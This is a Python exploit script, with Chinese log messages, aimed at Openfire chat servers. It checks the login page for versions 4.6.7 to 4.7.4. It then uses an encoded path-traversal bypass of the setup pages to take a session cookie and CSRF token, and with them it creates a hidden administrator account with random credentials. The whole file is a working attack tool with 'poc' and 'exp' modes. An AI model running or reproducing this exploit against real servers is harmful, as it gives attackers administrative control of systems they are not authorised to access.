import string
import urllib.request
import argparse
import regex
from urllib.error import HTTPError
import logging
import random
import sys

logging.basicConfig(stream=sys.stdout, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"
}


def check_version(url:str):
    try:
        request = urllib.request.Request(url=url+"/login.jsp", headers=headers)
        response = urllib.request.urlopen(request)
        body = response.read().decode("utf-8")
        matchobj = regex.findall(r"Openfire,\s\w*:\s*(\w+\.\w+\.\w+)", body)
        if matchobj[0] >= '4.6.7' and matchobj[0] <= '4.7.4':
            logging.info("[+]目标存在漏洞")
        else:
            logging.info("[-]目标不存在漏洞")
    except HTTPError as e:
        logging.info(f"{url} 发生http报错:{str(e)}")
    except Exception as e:
        logging.info(f"{url} 发生报错:{str(e)}")

def random_string(length):
    charset = string.ascii_lowercase + string.digits
    final_string = ''.join(random.choice(charset) for _ in range(length))
    return final_string



def get_token(url: str):
    payload = url + "/setup/setup-s/%u002e%u002e/%u002e%u002e/user-groups.jsp"
    request = urllib.request.Request(url=payload, headers=headers)
    try:
        res = urllib.request.urlopen(request)
    except HTTPError as e:
        if e.code == 500:
            cookies = e.headers.get_all('Set-Cookie')
            if len(cookies) == 1:
                jsessionid = cookies[0].split('=')[1].split(';')[0]
            if len(cookies) == 2:
                jsessionid = cookies[0].split('=')[1].split(';')[0]
                csrf_token = cookies[1].split('=')[1].split(';')[0]
        else:
            logging.info("[+]该网站测试有误，请进一步手动确认: %s" % url)
    return jsessionid, csrf_token

def exploit(url: str):
    jsessionid, csrf_token = get_token(url)
    username = random_string(7)
    password = random_string(7)
    payload = url + f"/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf={csrf_token}&username={username}&name=&email=&password={password}&passwordConfirm={password}&isadmin=on&create=Create%20User"
    cookie = {
        "Cookie": f"JSESSIONID={jsessionid}; csrf={csrf_token}"
    }
    request = urllib.request.Request(url=payload, headers=cookie)
    try:
        res = urllib.request.urlopen(request)
        if res.code == 200:
            logging.info(f"用户添加成功: username:{username} password:{password}")
        else:
            logging.info("用户添加失败")
    except Exception as e:
        logging.ingo(f"用户添加失败 发生错误 {str(e)}")
    

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', type=str, required=True, help="目标url--> Example: 127.0.0.1:8080")
    parser.add_argument('-m', '--mode', type=str, required=True, help="选择模式: poc--> v ,exp --> e")
    args = parser.parse_args()
    if not args.target.startswith("http://"):
        url = "http://" + args.target
    if args.mode == 'v':
        check_version(url)
    if args.mode == 'e':
        exploit(url)